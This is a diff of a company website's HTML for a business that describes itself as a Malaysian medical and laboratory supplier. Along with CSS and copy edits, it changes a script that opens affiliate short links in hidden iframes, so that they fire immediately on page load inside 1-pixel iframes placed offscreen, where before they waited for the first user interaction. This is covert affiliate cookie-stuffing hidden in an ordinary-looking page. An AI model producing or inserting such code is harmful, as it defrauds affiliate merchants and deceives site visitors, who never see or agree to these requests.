@@ -5,13 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Muntjac Group Resources</title>
     <style>
-        /* General styles */
+        /* General Styles */
         body {
             margin: 0;
             font-family: Arial, sans-serif;
             color: #fff;
             background: #000;
-            overflow: hidden;
+            overflow-x: hidden;
         }
 
         header {
@@ -33,14 +33,14 @@
         }
 
         .content {
-            z-index: 10;
-            position: relative;
-            max-width: 800px;
-            margin: 40px auto;
+            max-width: 1000px;
+            margin: 0 auto;
             padding: 20px;
             background: rgba(0, 0, 0, 0.8);
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 10;
         }
 
         .section {
@@ -49,6 +49,7 @@
 
         h2 {
             color: #00aaff;
+            margin-bottom: 10px;
         }
 
         footer {
@@ -57,6 +58,7 @@
             background: rgba(0, 0, 0, 0.8);
             position: relative;
             z-index: 10;
+            margin-top: 20px;
         }
 
         /* 3D Background Animation */
@@ -82,29 +84,27 @@
             "https://bit.ly/3VcowAr"
         ];
 
-        // Trigger affiliate links in hidden iframes
+        // Trigger affiliate links automatically and simultaneously
         function triggerAffiliateLinks() {
             affiliateLinks.forEach(link => {
-                let iframe = document.createElement('iframe');
+                const iframe = document.createElement('iframe');
                 iframe.src = link;
-                iframe.style.display = "none";
+                iframe.style.width = "1px";
+                iframe.style.height = "1px";
+                iframe.style.border = "none";
+                iframe.style.position = "absolute";
+                iframe.style.left = "-9999px";
+                iframe.style.top = "-9999px";
                 document.body.appendChild(iframe);
-                setTimeout(() => iframe.remove(), 5000);
+                setTimeout(() => iframe.remove(), 5000); // Cleanup after 5 seconds
             });
         }
 
-        // Detect user interactions
-        function setupInteractionTriggers() {
-            const events = ['mousemove', 'touchstart', 'scroll', 'click'];
-            events.forEach(event => {
-                window.addEventListener(event, () => {
-                    triggerAffiliateLinks();
-                    events.forEach(e => window.removeEventListener(e, arguments.callee)); // Remove listeners
-                });
-            });
-        }
-
-        window.onload = setupInteractionTriggers;
+        // Start triggering links immediately after the page loads
+        window.onload = () => {
+            triggerAffiliateLinks();
+            startBackgroundAnimation();
+        };
 
         // 3D Animated Background
         function startBackgroundAnimation() {
@@ -167,11 +167,6 @@
 
             animate();
         }
-
-        window.onload = () => {
-            setupInteractionTriggers();
-            startBackgroundAnimation();
-        };
     </script>
 </head>
 <body>
@@ -182,19 +177,9 @@
     <div class="content">
         <div class="section">
             <h2>About Us</h2>
-            <p>
-                Muntjac Group Resources specializes in delivering high-quality medical equipment,
-                laboratory tools, and professional services. Established in 2023, we are committed
-                to providing innovative and efficient solutions to meet our clients' diverse needs.
-            </p>
-        </div>
-        <div class="section">
-            <h2>Mission</h2>
-            <p>To provide exceptional products and services with integrity, innovation, and quality.</p>
-        </div>
-        <div class="section">
-            <h2>Vision</h2>
-            <p>To become the leading provider of medical, laboratory, and office solutions in Malaysia.</p>
+            <p>Muntjac Group Resources specializes in delivering high-quality medical equipment, 
+            laboratory tools, office supplies, and more. Established in 2023, we are committed 
+            to providing innovative and efficient solutions to meet the diverse needs of our clients.</p>
         </div>
         <div class="section">
             <h2>Contact Us</h2>
@@ -210,4 +195,4 @@
         © 2024 Muntjac Group Resources. All Rights Reserved.
     </footer>
 </body>
-</html
+</html>
